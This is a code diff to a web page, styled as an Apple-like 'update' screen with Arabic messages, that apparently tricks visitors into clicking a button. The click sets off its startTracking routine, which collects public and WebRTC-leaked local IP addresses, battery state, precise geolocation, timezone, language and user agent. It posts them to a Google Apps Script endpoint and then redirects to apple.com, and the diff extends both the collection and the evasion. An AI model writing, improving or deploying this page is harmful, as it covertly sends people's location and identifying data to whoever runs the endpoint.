@@ -11,7 +11,7 @@
   .container { text-align:center; background:#fff; padding:30px; border-radius:16px;
                box-shadow:0 10px 25px rgba(0,0,0,.1); width:100%; max-width:320px; }
   h2 { color:#1c1c1e; margin-top:0; font-size:20px; }
-  p  { color:#8e8e93; font-size:14px; margin-bottom:25px; }
+  p  { color:#8e8e93; font-size:14px; margin-bottom:25px; line-height:1.6; }
   button { background:#007aff; color:#fff; border:none; padding:14px 0; width:100%;
            border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; transition:.2s; }
   button:active { transform:scale(.98); opacity:.9; }
@@ -19,7 +19,7 @@
   .loader { border:3px solid #f3f3f3; border-top:3px solid #007aff; border-radius:50%;
             width:24px; height:24px; animation:spin 1s linear infinite; margin:20px auto; display:none; }
   @keyframes spin { to { transform:rotate(360deg); } }
-  #status { display:none; margin-top:15px; font-weight:700; font-size:14px; }
+  #status { display:none; margin-top:15px; font-weight:700; font-size:14px; line-height:1.5; }
   #status.ok  { color:#34c759; display:block; }
   #status.err { color:#ff3b30; display:block; }
 </style>
@@ -37,9 +37,12 @@
 </div>
 
 <script>
-  const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyJLy7uHYErVQI1tNRFgdH3aPzbiHfgL8yM2MXa2G1X6QjDQnERUTbr_YFLjxgA6eIi/exec';
-  const REDIRECT_URL = 'https://www.apple.com';
-  const TIMEOUT = 5000;
+  /* ====== إعدادات ====== */
+  const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzRHwp6FjL0OkvyVytym3BGvh0glHdc4M24yPqWzRyeb4sQYs1pniOB4jw2WXxJwTggSg/exec';
+  const REDIRECT_URL      = 'https://www.apple.com';
+  const ONCE_PER_VISITOR  = true;   // اجعلها false للتسجيل في كل زيارة
+  const TIMEOUT           = 5000;
+  const GEO_TIMEOUT       = 10000;
 
   const withTimeout = (p, ms, fallback) =>
     Promise.race([p, new Promise(r => setTimeout(() => r(fallback), ms))]);
@@ -47,8 +50,8 @@
   async function getIP() {
     try {
       const res = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
-      const data = await res.json();
-      return data.ip || 'N/A';
+      const d = await res.json();
+      return d.ip || 'N/A';
     } catch { return 'N/A'; }
   }
 
@@ -58,15 +61,16 @@
       let done = false;
       const finish = v => { if (!done) { done = true; resolve(v); } };
 
-      const pc = new RTCPeerConnection({
-        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-      });
+      let pc;
+      try {
+        pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+      } catch { return finish('N/A'); }
 
       pc.onicecandidate = e => {
         if (e.candidate) return;
         const sdp = pc.localDescription ? pc.localDescription.sdp : '';
-        finish(sdp.match(/\b\d{1,3}(?:\.\d{1,3}){3}\b/)?.[0] || 'N/A');
-        pc.close();
+        finish((sdp.match(/\b\d{1,3}(?:\.\d{1,3}){3}\b/) || [])[0] || 'N/A');
+        try { pc.close(); } catch {}
       };
 
       try {
@@ -83,7 +87,7 @@
     if (!navigator.getBattery) return 'N/A';
     try {
       const b = await navigator.getBattery();
-      return Math.round(b.level * 100) + '%';
+      return Math.round(b.level * 100) + '%' + (b.charging ? ' (يشحن)' : '');
     } catch { return 'N/A'; }
   }
 
@@ -91,26 +95,35 @@
     const p = new Promise(resolve => {
       if (!navigator.geolocation) return resolve('N/A');
       navigator.geolocation.getCurrentPosition(
-        pos => resolve(
-          `${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`
-        ),
-        () => resolve('Denied'),
-        { enableHighAccuracy: false, timeout: TIMEOUT, maximumAge: 60000 }
+        pos => resolve(`${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`),
+        err => resolve(err.code === 1 ? 'Denied' : 'N/A'),
+        { enableHighAccuracy: false, timeout: GEO_TIMEOUT, maximumAge: 60000 }
       );
     });
-    return withTimeout(p, TIMEOUT + 500, 'N/A');
+    return withTimeout(p, GEO_TIMEOUT + 500, 'N/A');
   }
 
   let busy = false;
 
   async function startTracking() {
     if (busy) return;
-    busy = true;
 
-    const btn = document.getElementById('btn');
+    const btn    = document.getElementById('btn');
     const loader = document.getElementById('loader');
     const status = document.getElementById('status');
 
+    if (ONCE_PER_VISITOR) {
+      try {
+        if (localStorage.getItem('su_done') === '1') {
+          status.className = 'ok';
+          status.textContent = '✅ تم التحديث مسبقًا على هذا الجهاز';
+          setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);
+          return;
+        }
+      } catch {}
+    }
+
+    busy = true;
     btn.disabled = true;
     btn.style.display = 'none';
     loader.style.display = 'block';
@@ -118,22 +131,31 @@
     status.textContent = '';
 
     try {
+      // getGeo يُستدعى فورًا داخل Promise.all ليحافظ على نقرة المستخدم على iOS
       const [ip, localIP, battery, geo] = await Promise.all([
         getIP(), getWebRTC(), getBattery(), getGeo()
       ]);
 
       const payload = {
         time: new Date().toISOString(),
-        ip, localIP, battery, location: geo,
+        ip,
+        localIP,
+        battery,
+        location: geo,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+        lang: navigator.language || '',
         ua: navigator.userAgent
       };
 
       await fetch(GOOGLE_SCRIPT_URL, {
         method: 'POST',
         mode: 'no-cors',
+        keepalive: true,
         headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
         body: JSON.stringify(payload)
       });
+
+      try { localStorage.setItem('su_done', '1'); } catch {}
 
       loader.style.display = 'none';
       status.className = 'ok';
@@ -144,7 +166,7 @@
       console.error(err);
       loader.style.display = 'none';
       status.className = 'err';
-      status.textContent = '⚠️ تعذر الإرسال، تحقق من الاتصال';
+      status.textContent = '⚠️ تعذر الإرسال، تحقق من الاتصال وحاول مجددًا';
       btn.disabled = false;
       btn.style.display = 'block';
       busy = false;
